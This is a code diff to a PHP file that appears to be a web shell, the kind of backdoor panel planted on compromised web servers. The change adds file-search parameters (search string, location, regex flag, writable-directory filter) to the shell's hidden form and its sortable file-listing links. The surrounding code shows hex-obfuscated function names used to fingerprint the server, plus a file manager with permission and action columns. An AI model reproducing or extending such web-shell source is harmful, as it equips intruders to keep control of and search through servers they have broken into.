@@ -504,7 +504,7 @@ function settable(tablename,doing,page) {
 	window.onbeforeunload = null;
 	$(\'gooddbform\').submit();
 }
-function sv(action,nowpath,p1,p2,p3,p4,p5,charsetpage,dir) {
+function sv(action,nowpath,p1,p2,p3,p4,p5,charsetpage,dir,findstr,findin,re,writabledb) {
 	if(action != null) $(\'opform\').action.value=action;
 	if(nowpath != null) $(\'opform\').nowpath.value=nowpath;
 	if(p1 != null) $(\'opform\').p1.value=p1;
@@ -514,10 +514,14 @@ function sv(action,nowpath,p1,p2,p3,p4,p5,charsetpage,dir) {
 	if(p5 != null) $(\'opform\').p5.value=p5;
 	if(charsetpage != null) $(\'opform\').charsetpage.value=charsetpage;
 	if(dir != null) $(\'opform\').dir.value=dir;
+	if(findstr != null) $(\'opform\').findstr.value=findstr;
+	if(findin != null) $(\'opform\').findin.value=findin;
+	if(re != null) $(\'opform\').re.value=re;
+	if(writabledb != null) $(\'opform\').writabledb.value=writabledb;
 }
-function g(action,nowpath,p1,p2,p3,p4,p5,charsetpage,dir) {
+function g(action,nowpath,p1,p2,p3,p4,p5,charsetpage,dir,findstr,findin,re,writabledb) {
 	if(!action) return;
-	sv(action,nowpath,p1,p2,p3,p4,p5,charsetpage,dir);
+	sv(action,nowpath,p1,p2,p3,p4,p5,charsetpage,dir,findstr,findin,re,writabledb);
 	window.onbeforeunload = null;
 	$(\'opform\').submit();
 }
@@ -540,6 +544,10 @@ makehide('p4', $p4);
 makehide('p5', $p5);
 makehide('charsetpage', $charsetpage);
 makehide('dir', $dir);
+makehide('findstr', '');
+makehide('findin', '');
+makehide('re', '');
+makehide('writabledb', '');
 formfoot();
 if (!$sf("\x70\x6f\x73\x69\x78\x5f\x67\x65\x74\x65\x67\x69\x64")) {//placemarkerhere
     $user  = @get_current_user();
@@ -1031,9 +1039,9 @@ function shownav(e){
         'selected' => $findin,
         'nokey' => 1));
     p('<input name="dir" value="' . $dir . '" type="hidden" /> <input name="re" value="1" type="checkbox" ' . ($re ? 'checked' : '') . ' /> Regular expressions</form></div></td></tr>');
-   p('<tr class="head"><td align="center"><input name="chkall" value="on" type="checkbox" onclick="$(\'ckallbx\').click();" /></td><td><a href="javascript:g(\'file\',\'' . $nowpath . '\',\'s_filename_'.($sort[1]?0:1).'\',null,null,null,null,\'' . $nowpath . '\');">File Name</a> '.($p1 == 's_filename_0' ? $uchar : '').($p1 == 's_filename_1' || !$p1 ? $dchar : '').'</td>');
-	p('<td width="16%"><a href="javascript:g(\'file\',\'' . $nowpath . '\',\'s_mtime_'.($sort[1]?0:1).'\',null,null,null,null,\'' . $nowpath . '\');">Last Modified</a> '.($p1 == 's_mtime_0' ? $dchar : '').($p1 == 's_mtime_1' ? $uchar : '').'</td>');
-	p('<td width="10%"><a href="javascript:g(\'file\',\'' . $nowpath . '\',\'s_size_'.($sort[1]?0:1).'\',null,null,null,null,\'' . $nowpath . '\');">Size</a> '.($p1 == 's_size_0' ? $uchar : '').($p1 == 's_size_1' ? $dchar : '').'</td>');
+   p('<tr class="head"><td align="center"><input name="chkall" value="on" type="checkbox" onclick="$(\'ckallbx\').click();" /></td><td><a href="javascript:g(\'file\',\'' . $nowpath . '\',\'s_filename_'.($sort[1]?0:1).'\',null,null,null,null, null,\'' . $nowpath . '\', \'' . $findstr . '\',\'' . $findin . '\', \'' . ($re ? '1' : '0') . '\', \'' . $writabledb . '\');">File Name</a> '.($p1 == 's_filename_0' ? $uchar : '').($p1 == 's_filename_1' || !$p1 ? $dchar : '').'</td>');
+	p('<td width="16%"><a href="javascript:g(\'file\',\'' . $nowpath . '\',\'s_mtime_'.($sort[1]?0:1).'\',null,null,null,null,null,\'' . $nowpath . '\', \'' . $findstr . '\',\'' . $findin . '\', \'' . ($re ? '1' : '0') . '\', \'' . $writabledb . '\');">Last Modified</a> '.($p1 == 's_mtime_0' ? $dchar : '').($p1 == 's_mtime_1' ? $uchar : '').'</td>');
+	p('<td width="10%"><a href="javascript:g(\'file\',\'' . $nowpath . '\',\'s_size_'.($sort[1]?0:1).'\',null,null,null,null,null,\'' . $nowpath . '\', \'' . $findstr . '\',\'' . $findin . '\', \'' . ($re ? '1' : '0') . '\', \'' . $writabledb . '\');">Size</a> '.($p1 == 's_size_0' ? $uchar : '').($p1 == 's_size_1' ? $dchar : '').'</td>');
     p('<td width="20%">Chmod / Perms</td><td width="22%">Action</td></tr>');
     $dirdata  = array();
     $filedata = array();
